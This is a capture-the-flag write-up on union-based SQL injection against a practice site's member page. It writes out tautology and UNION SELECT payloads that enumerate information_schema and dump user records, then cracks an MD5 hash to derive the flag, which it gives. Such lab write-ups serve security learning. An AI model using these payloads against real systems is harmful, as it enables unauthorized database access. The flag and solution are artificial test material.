# UNION BASED SQL INJECTION

## Flag
```
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

## Discovery
go to
```
 http://{IP_ADDRESS}/index.php?page=member
```
tryed a simple sql statement 
```
1 OR 1=1 
The SQL above is valid and will return ALL rows from the "users" table, since OR 1=1 is always TRUE.
```

Retrieve columns names with the table they belong to:
```
-1 UNION SELECT table_name,concat(column_name) FROM information_schema.COLUMNS 
```

Retrieve the id of the user (flag):
```
-1 UNION SELECT first_name, user_id FROM users
```

started investagting on that user (flag) by geting all its information each time changing col1, col2:
```
-1 UNION SELECT [col1_name], [col2_name] FROM db_default WHERE user_id=5
```

The table below show the result 

| user_id | first_name | last_name | town | country | planet | commentaire                                                                   | countersign 						|
| ------- | ---------- | --------- | ---- | ------- | ------ | ----------------------------------------------------------------------------- | ----------- 						|
|   5     | flag       | GetThe    |  42  |    42   |   42   | Decrypt this password -> then lower all the char. Sh256 on it and it's good ! | 5ff9d0165b4f92b14994e5c685cdce28 |

following the instruction :
* analyzing the password using [cipher identifier](https://www.dcode.fr/cipher-identifier)
* decrypt the password using [md5decrypt - md5](https://md5decrypt.net/en/)
* 5ff9d0165b4f92b14994e5c685cdce28 gives FortyTwo 
* lower all the char, encrypt it using Sh256
* flag is 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

## Helpers:
- [retrieve data from db](https://www.sqlinjection.net/table-names/)
- [dcode - cipher identifier](https://www.dcode.fr/cipher-identifier)
- [md5decrypt - md5](https://md5decrypt.net/en/)
